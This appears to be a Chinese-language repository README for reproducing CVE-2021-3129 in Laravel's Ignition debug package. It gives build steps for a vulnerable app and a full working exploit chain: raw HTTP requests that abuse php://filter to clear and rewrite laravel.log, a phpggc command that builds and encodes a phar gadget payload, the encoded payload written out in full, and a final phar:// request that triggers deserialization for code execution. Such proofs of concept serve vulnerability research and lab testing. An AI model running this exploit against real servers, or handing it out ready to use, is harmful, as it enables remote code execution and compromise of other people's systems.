# CVE-2021-3129

> Blog 首发于 [CVE-2021-3129 分析-云社区-华为云](https://bbs.huaweicloud.com/blogs/337020)

## Requirements

- PHP
- [Composer](https://getcomposer.org/)

## Build

1. `composer install`
2. `composer require facade/ignition==2.5.1`
3. `php artisan serve`

## Poc

1. 清空日志文件

```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
Content-Length: 196
Accept: application/json
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Origin: http://localhost:8000
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
 "variableName": "sxv",
 "viewFile": "php://filter/read=consumed/resource=../storage/logs/laravel.log"
 }
}
```

2. 发送 phar 文件

利用 phpgcc [^1] 生成 phar 文件并编码

```bash
> php -d 'phar.readonly=0' ./phpggc Laravel/RCE5 "phpinfo();" -p phar -o poc.phar
> php -r "echo file_get_contents('php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16le|convert.quote  
d-printable-encode/resource=poc.phar');" 
P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00...
N=00b=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00=3D=00
```

发送 phar 文件时，注意根据情况在 payload 前后进行补码

```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
Content-Length: 3222
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Origin: http://localhost:8000
Referer: http://localhost:8000/?XDEBUG_SESSION_START=16187
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
 "variableName": "sxv",
 "viewFile": "AAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00+=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00D=00I=00A=00Q=00A=00A=00T=00z=00o=000=00M=00D=00o=00i=00S=00W=00x=00s=00d=00W=001=00p=00b=00m=00F=000=00Z=00V=00x=00C=00c=00m=009=00h=00Z=00G=00N=00h=00c=003=00R=00p=00b=00m=00d=00c=00U=00G=00V=00u=00Z=00G=00l=00u=00Z=000=00J=00y=00b=002=00F=00k=00Y=002=00F=00z=00d=00C=00I=006=00M=00j=00p=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00l=00d=00m=00V=00u=00d=00H=00M=00i=00O=000=008=006=00M=00j=00U=006=00I=00k=00l=00s=00b=00H=00V=00t=00a=00W=005=00h=00d=00G=00V=00c=00Q=00n=00V=00z=00X=00E=00R=00p=00c=003=00B=00h=00d=00G=00N=00o=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00M=00T=00Y=006=00I=00g=00A=00q=00A=00H=00F=001=00Z=00X=00V=00l=00U=00m=00V=00z=00b=002=00x=002=00Z=00X=00I=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00M=00j=00U=006=00I=00k=001=00v=00Y=002=00t=00l=00c=00n=00l=00c=00T=00G=009=00h=00Z=00G=00V=00y=00X=00E=00V=002=00Y=00W=00x=00M=00b=002=00F=00k=00Z=00X=00I=00i=00O=00j=00A=006=00e=003=001=00p=00O=00j=00E=007=00c=00z=00o=000=00O=00i=00J=00s=00b=002=00F=00k=00I=00j=00t=009=00f=00X=00M=006=00O=00D=00o=00i=00A=00C=00o=00A=00Z=00X=00Z=00l=00b=00n=00Q=00i=00O=000=008=006=00M=00z=00g=006=00I=00k=00l=00s=00b=00H=00V=00t=00a=00W=005=00h=00d=00G=00V=00c=00Q=00n=00J=00v=00Y=00W=00R=00j=00Y=00X=00N=000=00a=00W=005=00n=00X=00E=00J=00y=00b=002=00F=00k=00Y=002=00F=00z=00d=00E=00V=002=00Z=00W=005=000=00I=00j=00o=00x=00O=00n=00t=00z=00O=00j=00E=00w=00O=00i=00J=00j=00b=002=005=00u=00Z=00W=00N=000=00a=00W=009=00u=00I=00j=00t=00P=00O=00j=00M=00y=00O=00i=00J=00N=00b=002=00N=00r=00Z=00X=00J=005=00X=00E=00d=00l=00b=00m=00V=00y=00Y=00X=00R=00v=00c=00l=00x=00N=00b=002=00N=00r=00R=00G=00V=00m=00a=00W=005=00p=00d=00G=00l=00v=00b=00i=00I=006=00M=00j=00p=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00j=00b=002=005=00m=00a=00W=00c=00i=00O=000=008=006=00M=00z=00U=006=00I=00k=001=00v=00Y=002=00t=00l=00c=00n=00l=00c=00R=002=00V=00u=00Z=00X=00J=00h=00d=00G=009=00y=00X=00E=001=00v=00Y=002=00t=00D=00b=002=005=00m=00a=00W=00d=001=00c=00m=00F=000=00a=00W=009=00u=00I=00j=00o=00x=00O=00n=00t=00z=00O=00j=00c=006=00I=00g=00A=00q=00A=00G=005=00h=00b=00W=00U=00i=00O=003=00M=006=00N=00z=00o=00i=00Y=00W=00J=00j=00Z=00G=00V=00m=00Z=00y=00I=007=00f=00X=00M=006=00N=00z=00o=00i=00A=00C=00o=00A=00Y=002=009=00k=00Z=00S=00I=007=00c=00z=00o=00y=00N=00T=00o=00i=00P=00D=009=00w=00a=00H=00A=00g=00c=00G=00h=00w=00a=00W=005=00m=00b=00y=00g=00p=00O=00y=00B=00l=00e=00G=00l=000=00O=00y=00A=00/=00P=00i=00I=007=00f=00X=001=009=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00M=00R=00g=00K=00G=00I=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00O=00/=00f=00e=004=00O=00w=00P=00Z=00E=00S=00E=00Q=00e=00a=00f=004=005=00A=00o=00i=00R=00J=00r=00g=00N=00b=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00=3D=00"
 }
}
```

3. 还原 phar 文件


```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
Content-Length: 271
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Origin: http://localhost:8000
Referer: http://localhost:8000/?XDEBUG_SESSION_START=16187
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
 "variableName": "sxv",
 "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
 }
}
```

4. 反序列化

```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
Content-Length: 167
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Origin: http://localhost:8000
Referer: http://localhost:8000/?XDEBUG_SESSION_START=16187
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
 "variableName": "sxv",
 "viewFile": "phar://../storage/logs/laravel.log"
 }
}
```


**Footnote**

[^1]:  [ambionics/phpggc: PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.](https://github.com/ambionics/phpggc)